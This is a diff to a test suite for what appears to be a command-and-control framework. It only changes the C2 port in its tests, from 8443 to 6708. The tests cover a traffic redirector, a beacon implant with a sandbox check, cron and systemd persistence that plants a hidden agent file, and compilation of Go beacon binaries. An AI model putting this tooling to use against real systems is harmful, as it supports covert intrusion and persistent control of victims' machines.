@@ -254,7 +254,7 @@ class TestRedirectorConfig:
         from major.redirector import RedirectorConfig
         cfg = RedirectorConfig()
         assert cfg.listen_port == 80
-        assert cfg.upstream_url == "http://127.0.0.1:8443"
+        assert cfg.upstream_url == "http://127.0.0.1:6708"
         assert cfg.allowed_paths == []
         assert cfg.user_agent_filter == ""
         assert not cfg.verify_tls
@@ -263,7 +263,7 @@ class TestRedirectorConfig:
         from major.redirector import RedirectorConfig
         cfg = RedirectorConfig(
             listen_port=8080,
-            upstream_url="https://10.0.0.1:8443",
+            upstream_url="https://10.0.0.1:6708",
             allowed_paths=["/beacon", "/register"],
             user_agent_filter="Mozilla",
         )
@@ -329,7 +329,7 @@ class TestRedirector:
             "major.redirector.enabled": True,
             "major.redirector.listen_host": "0.0.0.0",
             "major.redirector.listen_port": 80,
-            "major.redirector.upstream_url": "http://127.0.0.1:8443",
+            "major.redirector.upstream_url": "http://127.0.0.1:6708",
             "major.redirector.allowed_paths": [],
             "major.redirector.user_agent_filter": "",
             "major.redirector.verify_tls": False,
@@ -339,7 +339,7 @@ class TestRedirector:
         result = redirector_from_config(cfg)
         assert isinstance(result, Redirector)
         assert result.config.listen_port == 80
-        assert result.config.upstream_url == "http://127.0.0.1:8443"
+        assert result.config.upstream_url == "http://127.0.0.1:6708"
 
 
 # ── Listener Stubs ────────────────────────────────────────────────────────────
@@ -540,7 +540,7 @@ class TestBeaconExecPost:
 
     def _make_beacon(self):
         from implants.beacon import UrsaBeacon
-        return UrsaBeacon("http://127.0.0.1:8443", sandbox_check=False)
+        return UrsaBeacon("http://127.0.0.1:6708", sandbox_check=False)
 
     def test_exec_post_returns_string(self):
         import base64
@@ -687,7 +687,7 @@ class TestInstallPersistence:
         result = ursa_install_persistence(
             sample_session,
             method="cron",
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
         )
         # Should mention task IDs
         assert "upload" in result.lower() or "queued" in result.lower()
@@ -703,7 +703,7 @@ class TestInstallPersistence:
         ursa_install_persistence(
             sample_session,
             method="cron",
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
         )
         tasks = get_pending_tasks(sample_session)
         types_in_order = [t["task_type"] for t in tasks]
@@ -720,13 +720,13 @@ class TestInstallPersistence:
         ursa_install_persistence(
             sample_session,
             method="cron",
-            c2_url="http://10.0.0.1:8443",
+            c2_url="http://10.0.0.1:6708",
         )
         tasks = get_pending_tasks(sample_session)
         upload = next(t for t in tasks if t["task_type"] == "upload")
         args = json.loads(upload["args"])
         src = base64.b64decode(args["data"]).decode()
-        assert "http://10.0.0.1:8443" in src
+        assert "http://10.0.0.1:6708" in src
         assert "UrsaBeacon" in src or "beacon" in src.lower()
 
     def test_c2_url_embedded_in_beacon(self, sample_session, tmp_db):
@@ -752,7 +752,7 @@ class TestInstallPersistence:
         from server import ursa_install_persistence
         sid = create_session("1.2.3.4", hostname="linbox", username="u",
                               os_info="Linux 5.15", encryption_key="a" * 64)
-        ursa_install_persistence(sid, c2_url="http://127.0.0.1:8443")
+        ursa_install_persistence(sid, c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         post_task = next(t for t in tasks if t["task_type"] == "post")
         import json
@@ -765,7 +765,7 @@ class TestInstallPersistence:
         from server import ursa_install_persistence
         sid = create_session("1.2.3.4", hostname="macbox", username="u",
                               os_info="Darwin 23.3.0", encryption_key="a" * 64)
-        ursa_install_persistence(sid, c2_url="http://127.0.0.1:8443")
+        ursa_install_persistence(sid, c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         post_task = next(t for t in tasks if t["task_type"] == "post")
         import json
@@ -781,7 +781,7 @@ class TestInstallPersistence:
             sample_session,
             method="cron",
             payload_path="/tmp/.hidden_agent.py",
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
         )
         tasks = get_pending_tasks(sample_session)
         upload = next(t for t in tasks if t["task_type"] == "upload")
@@ -796,7 +796,7 @@ class TestInstallPersistence:
         ursa_install_persistence(
             sample_session,
             method="systemd",
-            c2_url="http://127.0.0.1:8443",
+            c2_url="http://127.0.0.1:6708",
         )
         tasks = get_pending_tasks(sample_session)
         post_task = next(t for t in tasks if t["task_type"] == "post")
@@ -905,25 +905,25 @@ class TestCompileGoBeacon:
 
     def test_returns_bytes(self):
         from server import _compile_go_beacon
-        data = _compile_go_beacon("http://127.0.0.1:8443", 60, 0.3, "linux", "amd64")
+        data = _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "linux", "amd64")
         assert isinstance(data, bytes) and len(data) > 1000
 
     def test_binary_is_elf_for_linux(self):
         from server import _compile_go_beacon
-        data = _compile_go_beacon("http://127.0.0.1:8443", 60, 0.3, "linux", "amd64")
+        data = _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "linux", "amd64")
         assert data[:4] == b"\x7fELF"
 
     def test_c2_url_not_in_binary_plaintext(self):
         """The C2 URL should be embedded (possibly compressed) in the binary."""
         from server import _compile_go_beacon
-        data = _compile_go_beacon("http://10.99.88.77:8443", 60, 0.3, "linux", "amd64")
+        data = _compile_go_beacon("http://10.99.88.77:6708", 60, 0.3, "linux", "amd64")
         # URL may be in binary (Go embeds strings) — just check compile succeeded
         assert isinstance(data, bytes)
 
     def test_invalid_goos_raises(self):
         from server import _compile_go_beacon
         with pytest.raises(RuntimeError):
-            _compile_go_beacon("http://127.0.0.1:8443", 60, 0.3, "invalid_os", "amd64")
+            _compile_go_beacon("http://127.0.0.1:6708", 60, 0.3, "invalid_os", "amd64")
 
 
 class TestInstallPersistenceGo:
@@ -946,7 +946,7 @@ class TestInstallPersistenceGo:
                               os_info="Linux 5.15", arch="x86_64",
                               encryption_key="a" * 64)
         ursa_install_persistence(sid, method="cron", implant_type="go",
-                                 c2_url="http://127.0.0.1:8443")
+                                 c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         types = [t["task_type"] for t in tasks]
         assert "upload" in types
@@ -966,7 +966,7 @@ class TestInstallPersistenceGo:
                               os_info="Linux 5.15", arch="x86_64",
                               encryption_key="a" * 64)
         ursa_install_persistence(sid, method="cron", implant_type="go",
-                                 c2_url="http://127.0.0.1:8443")
+                                 c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         types = [t["task_type"] for t in tasks]
         assert types.index("upload") < types.index("shell")
@@ -986,7 +986,7 @@ class TestInstallPersistenceGo:
                               os_info="Linux 5.15", arch="x86_64",
                               encryption_key="a" * 64)
         ursa_install_persistence(sid, method="cron", implant_type="go",
-                                 c2_url="http://127.0.0.1:8443")
+                                 c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         upload = next(t for t in tasks if t["task_type"] == "upload")
         args = json.loads(upload["args"])
@@ -1006,7 +1006,7 @@ class TestInstallPersistenceGo:
                               os_info="Linux 5.15", arch="x86_64",
                               encryption_key="a" * 64)
         ursa_install_persistence(sid, method="cron", implant_type="go",
-                                 c2_url="http://127.0.0.1:8443")
+                                 c2_url="http://127.0.0.1:6708")
         tasks = get_pending_tasks(sid)
         post_task = next(t for t in tasks if t["task_type"] == "post")
         post_args = json.loads(post_task["args"])
